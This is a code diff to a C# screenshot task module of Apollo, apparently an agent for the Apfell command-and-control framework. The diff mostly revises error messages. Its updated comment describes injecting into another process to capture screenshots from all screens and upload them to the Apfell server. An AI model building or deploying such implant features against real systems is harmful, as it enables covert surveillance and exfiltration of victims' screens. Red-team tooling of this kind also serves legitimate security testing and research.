@@ -23,7 +23,8 @@ using System.Runtime.Serialization.Formatters.Binary;
 using System.Collections.Generic;
 
 /// <summary>
-/// This task will capture a screenshot and upload it to the Apfell server
+/// This task will inject into another process and capture screenshots from all screens and upload it to the Apfell server.
+/// Author: @reznok
 /// </summary>
 namespace Apollo.CommandModules
 {
@@ -120,14 +121,15 @@ namespace Apollo.CommandModules
                     {
                         // Console.WriteLine("Error receiving screenshots from pipe.");
                         pipeClient.Close();
+                        job.SetError("Error deserializing screenshots received over pipe");
                         return;
                     }
 
 
 
-                    if (screenShots == null)
+                    if (screenShots == null || screenShots.Count == 0)
                     {
-                        job.SetError("0 Screenshots Were Returned");
+                        job.SetError("Task executed successfully, but 0 Screenshots Were Returned");
                         return;
                     }
 
@@ -141,7 +143,7 @@ namespace Apollo.CommandModules
 
                     catch
                     {
-                        job.SetError("Failed to upload screenshots.");
+                        job.SetError("Failed to send screenshots to server.");
                         return;
                     }
 
